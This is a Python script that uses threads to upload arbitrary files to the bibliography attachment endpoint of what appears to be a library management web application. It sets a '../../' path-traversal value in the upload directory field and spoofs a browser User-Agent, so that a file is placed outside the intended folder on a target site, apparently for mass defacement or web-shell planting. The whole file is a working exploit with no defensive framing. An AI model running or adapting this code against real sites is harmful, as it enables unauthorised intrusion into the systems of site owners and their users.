import threading,requests
from time import sleep

class GasKeun(threading.Thread):
     	def __init__(self, url, files, subdo, data):
     		threading.Thread.__init__(self)
		self.url = url
		self.files =  {'file2attach': open(files,'rb')}
		#print self.files
		self.subdo = subdo
		#print self.subdo
		self.exploit = "/admin/modules/bibliography/pop_attach.php?biblioID=0"
		self.uagent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		if data == 1:
			self.data = {"fileTitle":"Odiq", "fileDir":"../../%s" % (self.subdo), "fileURL":"", "fileDesc":"", "accessType":"public", "upload":"Unggah Sekarang"}
		if data == 2:
			self.data = {"fileTitle":"Odiq", "fileDir":"../../%s" % (self.subdo), "fileURL":"", "fileDesc":"", "accessType":"public", "upload":"Upload Now"}
	def run(self):
		try:
			urll = (self.url+self.exploit)
			web = urll.split("://")[1]
			webs = web.replace("//", "/")
			wut = ("http://"+webs)
			#print self.url + self.exploit
			#print self.data
			r = requests.post(wut, files=self.files, data=self.data, headers=self.uagent)
		except KeyboardInterrupt:
            		pass
		#except:
			#pass

